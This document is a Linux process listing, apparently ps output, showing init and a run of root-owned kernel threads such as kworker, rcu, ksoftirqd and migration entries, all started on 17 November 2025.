    PID USER                      STARTED COMMAND
      1 root     Mon Nov 17 19:43:32 2025 /sbin/init splash
      2 root     Mon Nov 17 19:43:32 2025 [kthreadd]
      3 root     Mon Nov 17 19:43:32 2025 [pool_workqueue_release]
      4 root     Mon Nov 17 19:43:32 2025 [kworker/R-rcu_gp]
      5 root     Mon Nov 17 19:43:32 2025 [kworker/R-sync_wq]
      6 root     Mon Nov 17 19:43:32 2025 [kworker/R-kvfree_rcu_reclaim]
      7 root     Mon Nov 17 19:43:32 2025 [kworker/R-slub_flushwq]
      8 root     Mon Nov 17 19:43:32 2025 [kworker/R-netns]
     10 root     Mon Nov 17 19:43:32 2025 [kworker/0:1-events]
     11 root     Mon Nov 17 19:43:32 2025 [kworker/0:0H-events_highpri]
     12 root     Mon Nov 17 19:43:32 2025 [kworker/u512:0-ipv6_addrconf]
     13 root     Mon Nov 17 19:43:32 2025 [kworker/R-mm_percpu_wq]
     14 root     Mon Nov 17 19:43:32 2025 [rcu_tasks_kthread]
     15 root     Mon Nov 17 19:43:32 2025 [rcu_tasks_rude_kthread]
     16 root     Mon Nov 17 19:43:32 2025 [rcu_tasks_trace_kthread]
     17 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/0]
     18 root     Mon Nov 17 19:43:32 2025 [rcu_preempt]
     19 root     Mon Nov 17 19:43:32 2025 [rcu_exp_par_gp_kthread_worker/1]
     20 root     Mon Nov 17 19:43:32 2025 [rcu_exp_gp_kthread_worker]
     21 root     Mon Nov 17 19:43:32 2025 [migration/0]
     22 root     Mon Nov 17 19:43:32 2025 [idle_inject/0]
     23 root     Mon Nov 17 19:43:32 2025 [cpuhp/0]
     24 root     Mon Nov 17 19:43:32 2025 [cpuhp/1]
     25 root     Mon Nov 17 19:43:32 2025 [idle_inject/1]
     26 root     Mon Nov 17 19:43:32 2025 [migration/1]
     27 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/1]
     29 root     Mon Nov 17 19:43:32 2025 [kworker/1:0H-events_highpri]
     30 root     Mon Nov 17 19:43:32 2025 [cpuhp/2]
     31 root     Mon Nov 17 19:43:32 2025 [idle_inject/2]
     32 root     Mon Nov 17 19:43:32 2025 [migration/2]
     33 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/2]
     34 root     Mon Nov 17 19:43:32 2025 [kworker/2:0-events]
     35 root     Mon Nov 17 19:43:32 2025 [kworker/2:0H-kblockd]
     36 root     Mon Nov 17 19:43:32 2025 [cpuhp/3]
     37 root     Mon Nov 17 19:43:32 2025 [idle_inject/3]
     38 root     Mon Nov 17 19:43:32 2025 [migration/3]
     39 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/3]
     40 root     Mon Nov 17 19:43:32 2025 [kworker/3:0-cgroup_destroy]
     41 root     Mon Nov 17 19:43:32 2025 [kworker/3:0H-events_highpri]
     42 root     Mon Nov 17 19:43:32 2025 [kworker/u513:0-flush-8:0]
     43 root     Mon Nov 17 19:43:32 2025 [kworker/u514:0-flush-8:0]
     44 root     Mon Nov 17 19:43:32 2025 [kworker/u515:0-flush-8:0]
     46 root     Mon Nov 17 19:43:32 2025 [kdevtmpfs]
     47 root     Mon Nov 17 19:43:32 2025 [kworker/R-inet_frag_wq]
     48 root     Mon Nov 17 19:43:32 2025 [kauditd]
